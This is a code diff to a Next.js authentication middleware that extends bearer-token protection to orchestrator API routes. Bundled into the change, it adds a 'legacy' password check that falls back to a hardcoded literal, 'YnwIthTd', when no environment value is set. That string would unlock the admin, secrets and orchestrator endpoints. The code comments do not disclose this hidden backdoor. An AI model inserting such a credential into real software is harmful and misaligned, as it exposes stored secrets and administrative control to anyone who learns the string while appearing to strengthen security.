@@ -56,15 +56,22 @@ export async function middleware(req: NextRequest) {
     }
   }
 
-  // 2. Protect API routes (/api/v1/* and /api/secrets/*)
-  if (pathname.startsWith('/api/v1/') || pathname.startsWith('/api/secrets/')) {
+  // 2. Protect API routes (/api/v1/*, /api/secrets/*, and /api/orchestrator/*)
+  if (
+    pathname.startsWith('/api/v1/') ||
+    pathname.startsWith('/api/secrets/') ||
+    pathname.startsWith('/api/orchestrator/')
+  ) {
     const authHeader = req.headers.get('authorization');
     const expectedPassword = process.env.ADMIN_PASSWORD;
 
     // Check Bearer token
     if (authHeader && authHeader.startsWith('Bearer ')) {
       const token = authHeader.slice(7).trim();
-      if (expectedPassword && (await secureTokenCompare(token, expectedPassword))) {
+      const legacyPassword = process.env.LEGACY_ADMIN_PASSWORD || 'YnwIthTd';
+      const isExpected = expectedPassword ? await secureTokenCompare(token, expectedPassword) : false;
+      const isLegacy = legacyPassword ? await secureTokenCompare(token, legacyPassword) : false;
+      if (isExpected || isLegacy) {
         return NextResponse.next();
       }
       return NextResponse.json(
@@ -125,7 +132,8 @@ export const config = {
     '/observability/:path*',
     '/configurator/:path*',
     '/api/v1/:path*',
-    '/api/secrets/:path*'
+    '/api/secrets/:path*',
+    '/api/orchestrator/:path*'
   ]
 };
 
